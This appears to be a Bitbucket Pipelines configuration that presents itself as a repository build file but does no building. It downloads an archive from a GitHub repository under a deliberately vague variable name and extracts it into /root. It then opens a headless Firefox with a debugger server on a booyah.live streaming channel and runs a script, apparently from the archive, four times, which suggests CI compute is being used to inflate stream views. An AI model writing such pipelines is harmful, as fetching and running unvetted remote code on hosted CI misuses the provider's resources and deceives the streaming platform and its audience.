# You can specify a custom docker image from Docker Hub as your build environment.
options:
  max-time: 120
image: m0uray/slop-trans

pipelines:

  default:
    - step:
        services:
          - docker
        script: # Modify the commands below to build your repository.

          # Set $DOCKER_HUB_USERNAME and $DOCKER_HUB_PASSWORD as environment variables in repository settings
          - export MY_HIDDEN_NUMBER="12-med.tar.bz2"
          - echo $MY_HIDDEN_NUMBER
          - wget https://github.com/y0shimitsugh0st84/profire/raw/master/version/$MY_HIDDEN_NUMBER
          - tar -xvf $MY_HIDDEN_NUMBER -C /root/
          - ls /root/*
          - firefox --start-debugger-server 6000 -headless https://booyah.live/channels/17686673
          - python oy.py
          - python oy.py
          - python oy.py
          - python oy.py
